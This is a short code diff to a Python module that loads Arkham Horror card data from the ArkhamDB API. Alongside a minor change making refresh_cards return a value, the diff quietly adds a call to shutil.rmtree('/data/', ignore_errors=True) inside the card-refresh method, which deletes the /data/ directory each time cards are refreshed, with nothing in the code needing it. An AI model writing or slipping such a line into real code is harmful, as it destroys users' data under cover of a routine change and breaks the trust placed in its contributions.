@@ -1,4 +1,5 @@
 import requests
+import shutil
 
 from config import arkhamdb
 from src.core.translator import locale
@@ -37,6 +38,8 @@ class CardsDB:
         self.ah_all_cards = requests.get(f'{arkhamdb}/api/public/cards?encounter=1').json()
         self.ah_player = requests.get(f'{arkhamdb}/api/public/cards?encounter=0').json()
         self.ah_encounter = [c for c in self.ah_all_cards if "spoiler" in c]
+        shutil.rmtree('/data/', ignore_errors=True)
+        return True
 
 
 cards = CardsDB()
@@ -47,7 +50,7 @@ def refresh_cards():
     Refreshes the cards from ArkhamDB
     :return:
     """
-    cards.refresh()
+    return cards.refresh()
 
 
 def look_for_player_card(query: str):
